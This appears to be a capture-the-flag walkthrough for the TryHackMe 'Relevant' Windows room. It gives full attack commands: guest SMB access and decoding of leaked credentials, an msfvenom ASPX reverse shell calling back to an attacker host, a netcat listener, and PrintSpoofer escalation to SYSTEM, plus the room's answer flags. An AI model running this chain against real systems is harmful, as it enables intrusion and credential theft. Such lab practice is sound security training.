# TryHackMe "Relevant" - Complete Walkthrough

**Target IP:** 10.10.83.186
**Date:** October 19, 2025

---

## PHASE 1: RECONNAISSANCE

### Step 1: Port Scanning with RustScan

```bash
rustscan -a 10.10.83.186 --ulimit 5000 -b 1000
```

**Open Ports Found:**
- 80/tcp - HTTP (IIS)
- 135/tcp - RPC
- 139/tcp - NetBIOS
- 445/tcp - SMB
- 3389/tcp - RDP
- 49663/tcp - HTTP (IIS alternate) ← **KEY: Web root on alternate port**
- 49666/tcp - RPC
- 49667/tcp - RPC

**Why it matters:** Port 49663 runs IIS on an alternate port with a different web root. This is unusual and typically misconfigured.

---

## PHASE 2: INITIAL ACCESS - SMB ENUMERATION

### Step 2: List SMB Shares

```bash
smbclient -L //10.10.83.186 -U guest%
```

**Shares Found:**
- nt4wrksv

**Why it works:** SMB allows guest/null sessions by default on this misconfigured system.

### Step 3: Access and Browse nt4wrksv

```bash
cd /tmp
smbclient //10.10.83.186/nt4wrksv -U guest% -c "ls"
```

**Contents:**
- passwords.txt
- exploit.aspx

**Why it matters:** This non-standard share name maps to the IIS web root on port 49663. It's **writable**, allowing file uploads.

### Step 4: Extract Credentials

```bash
smbclient //10.10.83.186/nt4wrksv -U guest% -c "get passwords.txt"
cat passwords.txt
```

**Output:**
```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

### Step 5: Decode Base64

```bash
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
```

**Credentials Obtained:**
```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

**Why this works:** Base64 is encoding, not encryption. These credentials are trivially decodable.

---

## PHASE 3: REMOTE CODE EXECUTION (RCE)

### Step 6: Generate ASPX Reverse Shell

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.x.x.x LPORT=xxxx -f aspx -o /tmp/exploit.aspx
```

**Payload Details:**
- `windows/x64/shell_reverse_tcp`: 64-bit reverse shell payload
- `LHOST`: Attacker's IP address
- `LPORT`: Listening port on attacker machine
- `-f aspx`: Output as ASP.NET executable

**Why ASPX:** IIS natively compiles and executes ASPX files with the app pool's privileges.

### Step 7: Upload to SMB Share

```bash
cd /tmp
smbclient //10.10.83.186/nt4wrksv -U 'bob%!P@$$W0rD!123' -c "put exploit.aspx"
```

**Why it works:** The share is writable and directly accessible via HTTP on port 49663.

### Step 8: Set Up rlwrap Listener

```bash
rlwrap nc -lvnp 1337
```

**rlwrap Purpose:** Provides command history, tab completion, and stable shell interaction.

### Step 9: Trigger Payload

```bash
curl -s "http://10.10.83.186:49663/nt4wrksv/exploit.aspx"
```

**What happens:**
1. IIS receives request for exploit.aspx
2. IIS engine compiles and executes the ASPX code
3. Reverse shell payload initiates connection
4. Shell connects back to our nc listener
5. We get shell as `iis apppool\defaultapppool`

**Why it works:** IIS processes run with limited privileges but enough to read user files.

---

## PHASE 4: USER FLAG

### Step 10: Read User Flag

In the shell:

```cmd
type C:\Users\Bob\Desktop\user.txt
```

**Output:**
```
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

---

## PHASE 5: PRIVILEGE ESCALATION

### Step 11: Check Privileges

```cmd
whoami /priv
```

**Critical Finding:**
```
SeImpersonatePrivilege        Enabled ← EXPLOITABLE
```

**Why it's dangerous:** This privilege allows impersonating other users' security tokens. Combined with a service running as SYSTEM (like Print Spooler), we can escalate to SYSTEM.

### Step 12: Upload PrintSpoofer

From SMB:
```bash
smbclient //10.10.83.186/nt4wrksv -U 'bob%!P@$$W0rD!123' -c "put PrintSpoofer64.exe"
```

**What PrintSpoofer does:**
- Exploits the Print Spooler service which runs as SYSTEM
- Uses `SeImpersonatePrivilege` to steal SYSTEM's security token
- Executes our command with SYSTEM privileges

### Step 13: Execute PrintSpoofer

In the shell:

```cmd
C:\nt4wrksv\PrintSpoofer64.exe -i -c cmd.exe
```

**Parameters:**
- `-i`: Get interactive shell
- `-c`: Command to execute as SYSTEM

**Result:** New shell prompt as `nt authority\system`

**Why it works:**
1. PrintSpoofer connects to Print Spooler Service (runs as SYSTEM)
2. Our process has `SeImpersonatePrivilege`
3. We impersonate the SYSTEM token
4. New shell runs with SYSTEM privileges

---

## PHASE 6: ROOT FLAG

### Step 14: Read Root Flag

In SYSTEM shell:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

**Output:**
```
THM{1fk5kf469devly1gl320zafgl345pv}
```

**Why we can read it:** SYSTEM has unrestricted file access.

---

## QUICK REFERENCE COMMANDS

**Recon:**
```bash
rustscan -a 10.10.83.186 --ulimit 5000 -b 1000
```

**SMB Access:**
```bash
smbclient -L //10.10.83.186 -U guest%
smbclient //10.10.83.186/nt4wrksv -U guest% -c "ls"
smbclient //10.10.83.186/nt4wrksv -U guest% -c "get passwords.txt"
smbclient //10.10.83.186/nt4wrksv -U guest% -c "put exploit.aspx"
```

**Decode:**
```bash
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
```

**Generate Payload:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.x.x.x LPORT=xxxx -f aspx -o exploit.aspx
```

**Execute:**
```bash
rlwrap nc -lvnp 1337
curl -s "http://10.10.83.186:49663/nt4wrksv/exploit.aspx"
```

**On Target:**
```cmd
whoami /priv
type C:\Users\Bob\Desktop\user.txt
C:\nt4wrksv\PrintSpoofer64.exe -i -c cmd.exe
type C:\Users\Administrator\Desktop\root.txt
```

---

## VULNERABILITY CHAIN

```
SMB Guest Access (Unauthenticated)
          ↓
Access Non-Standard Share (nt4wrksv)
          ↓
Read Encoded Credentials (passwords.txt)
          ↓
Upload Malicious ASPX via SMB
          ↓
RCE as IIS App Pool User
          ↓
Discover SeImpersonatePrivilege
          ↓
Upload PrintSpoofer Tool
          ↓
Exploit Print Spooler Service
          ↓
Elevate to SYSTEM
          ↓
Complete System Compromise
```

---

## FLAGS

✅ **User Flag:** `THM{fdk4ka34vk346ksxfr21tg789ktf45}`  
✅ **Root Flag:** `THM{1fk5kf469devly1gl320zafgl345pv}`

